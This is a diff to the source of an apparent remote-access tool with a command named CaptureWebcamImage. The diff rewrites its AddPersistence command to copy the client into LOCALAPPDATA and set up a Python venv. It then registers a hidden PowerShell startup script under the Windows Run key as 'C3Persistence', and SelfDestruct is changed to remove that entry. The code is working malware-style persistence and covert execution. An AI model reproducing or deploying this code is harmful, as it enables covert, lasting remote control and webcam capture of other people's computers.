@@ -531,11 +531,11 @@ class CaptureWebcamImage(DoubleCommand):
 class AddPersistence(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
-        import urllib.request
+        from shared.command_consts import CLIENT_STARTUP_SCRIPT, ADD_SELF_TO_PATH
         import subprocess
-        import zipfile
         import winreg
         import shutil
+        import sys
         import os
 
         def bail(msg: str) -> None:
@@ -548,63 +548,38 @@ class AddPersistence(DoubleCommand):
         key_name = "C3Persistence"
         folder_name = key_name
         folder_path = f"{os.getenv('LOCALAPPDATA')}/{folder_name}"
+        startup_script_path = f"{folder_path}/startup.ps1"
 
-        runtime_path = f"{folder_path}/runtime"
-        runtime_zip_path = f"{runtime_path}/python-3.12.1-embed-amd64.zip"
         try:
             os.mkdir(folder_path)
         except OSError:
             bail("OSERR_CREA_FOLDER")
             return
-        os.mkdir(runtime_path)
 
-        try:
-            urllib.request.urlretrieve(
-                "https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-amd64.zip",
-                runtime_zip_path,
-            )
-            with zipfile.ZipFile(runtime_zip_path, "r") as zip_file:
-                zip_file.extractall(runtime_path)
-            os.remove(runtime_zip_path)
-        except Exception:
-            bail("GETPY_ERR")
-            return
-
-        try:
-            urllib.request.urlretrieve(
-                "https://bootstrap.pypa.io/get-pip.py", f"{runtime_path}/get-pip.py"
-            )
-            get_pip_runner = subprocess.Popen(
-                f"{runtime_path}/python.exe {runtime_path}/get-pip.py",
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-            get_pip_runner.wait()
-            os.remove(f"{runtime_path}/get-pip.py")
-        except OSError:
-            bail("GETPIP_ERR")
+        venv_creator = subprocess.Popen([sys.executable, "-m", "venv", folder_path])
+        if venv_creator.wait() != 0:
+            bail("VENV_ERR")
             return
 
         shutil.copytree("./client_extras", f"{folder_path}/client_extras")
         shutil.copytree("./server_extras", f"{folder_path}/server_extras")
         shutil.copytree("./shared", f"{folder_path}/shared")
-        # .pyw files do not show a console window
-        shutil.copy("./server.py", f"{folder_path}/server.pyw")
-        shutil.copy("./client.py", f"{folder_path}/client.pyw")
+        shutil.copy("./server.py", f"{folder_path}/server.py")
+        shutil.copy("./client.py", f"{folder_path}/client.py")
 
-        add_self_to_path = """import os.path
-import sys
-
-sys.path.append(os.path.split(__file__)[0])
-"""
-        with open(f"{folder_path}/client.pyw", "r+") as client_file:
+        with open(f"{folder_path}/client.py", "r+") as client_file, open(
+            f"{folder_path}/server.py", "r+"
+        ) as server_file:
             client_file_contents = client_file.read()
-            client_file.seek(0)
-            client_file.write(add_self_to_path + client_file_contents)
-        with open(f"{folder_path}/server.pyw", "r+") as server_file:
             server_file_contents = server_file.read()
+            client_file.seek(0)
             server_file.seek(0)
-            server_file.write(add_self_to_path + server_file_contents)
+            client_file.write(ADD_SELF_TO_PATH + client_file_contents)
+            server_file.write(ADD_SELF_TO_PATH + server_file_contents)
+        with open(startup_script_path, "w") as startup_script:
+            startup_script.write(
+                CLIENT_STARTUP_SCRIPT.replace("{{ TARGET_DIR }}", folder_path)
+            )
 
         try:
             with winreg.OpenKey(
@@ -618,7 +593,7 @@ sys.path.append(os.path.split(__file__)[0])
                     key_name,
                     0,
                     winreg.REG_SZ,
-                    f"{runtime_path}/pythonw.exe {folder_path}/client.pyw",
+                    f"powershell -WindowStyle Hidden -NoProfile -File {startup_script_path}",
                 )
         except OSError:
             bail("REG_ERR")
@@ -640,11 +615,8 @@ sys.path.append(os.path.split(__file__)[0])
             case "REG_ERR":
                 print("Client encountered registry error")
                 return CommandResult(DoubleCommandResult.failure)
-            case "GETPY_ERR":
-                print("Client failed to download the portable python environment")
-                return CommandResult(DoubleCommandResult.failure)
-            case "GETPIP_ERR":
-                print("Client failed to download PIP (Pythons Intergalactic Penis)")
+            case "VENV_ERR":
+                print("Client could not install virtual python environment")
                 return CommandResult(DoubleCommandResult.failure)
             case "OSERR_CREA_FOLDER":
                 print(
@@ -766,18 +738,10 @@ class SelfDestruct(DoubleCommand):
         try:
             with winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
-                "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                access=winreg.KEY_READ | winreg.KEY_WRITE,
-            ) as startup_entries_key:
-                num_entries = winreg.QueryInfoKey(startup_entries_key)[1]
-
-                for entry_index in range(num_entries):
-                    key_name, *_ = winreg.EnumValue(startup_entries_key, entry_index)
-                    if key_name == "C3Persistence":
-                        winreg.DeleteKey(
-                            startup_entries_key,
-                            key_name,
-                        )
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                access=winreg.KEY_SET_VALUE,
+            ) as persistence_key:
+                winreg.DeleteValue(persistence_key, "C3Persistence")
         except Exception:
             pass
 
